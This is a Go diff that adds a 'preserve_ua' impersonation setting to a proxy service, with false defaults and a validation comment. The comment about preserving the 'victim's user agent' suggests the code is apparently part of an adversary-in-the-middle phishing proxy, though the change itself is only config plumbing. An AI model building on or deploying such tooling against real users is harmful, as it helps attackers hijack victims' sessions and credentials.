@@ -46,6 +46,7 @@ type ProxyServiceImpersonation struct {
 	Browser     string `yaml:"browser,omitempty"`      // chrome, firefox, or empty for none
 	OS          string `yaml:"os,omitempty"`           // windows, macos, linux, android, ios, random, or empty for auto
 	HTTPVersion string `yaml:"http_version,omitempty"` // http1, http2, http3, or empty for default
+	PreserveUA  *bool  `yaml:"preserve_ua,omitempty"`  // preserve victim's user agent (default: false - overwrites surf's UA after impersonation)
 }
 
 // ProxyServiceDomainConfig represents configuration for a specific domain mapping
@@ -1022,11 +1023,13 @@ func (m *Proxy) setProxyConfigDefaults(config *ProxyServiceConfigYAML) {
 	// set default impersonation settings if not configured
 	if config.Impersonation == nil {
 		trueValue := true
+		falseValue := false
 		config.Impersonation = &ProxyServiceImpersonation{
 			Enabled:     &trueValue,
 			Browser:     "chrome",
 			OS:          "windows",
 			HTTPVersion: "http2",
+			PreserveUA:  &falseValue,
 		}
 	} else {
 		// fill in missing impersonation fields with defaults
@@ -1042,6 +1045,10 @@ func (m *Proxy) setProxyConfigDefaults(config *ProxyServiceConfigYAML) {
 		}
 		if config.Impersonation.HTTPVersion == "" {
 			config.Impersonation.HTTPVersion = "http2"
+		}
+		if config.Impersonation.PreserveUA == nil {
+			falseValue := false
+			config.Impersonation.PreserveUA = &falseValue
 		}
 	}
 
@@ -1454,6 +1461,9 @@ func (m *Proxy) validateImpersonation(config *ProxyServiceConfigYAML) error {
 		// normalize to lowercase
 		imp.HTTPVersion = version
 	}
+
+	// validate preserve_ua is a boolean (already validated by YAML parser)
+	// no additional validation needed - it's either nil, true, or false
 
 	// validate enabled is a boolean (already validated by YAML parser)
 	// no additional validation needed - it's either nil, true, or false
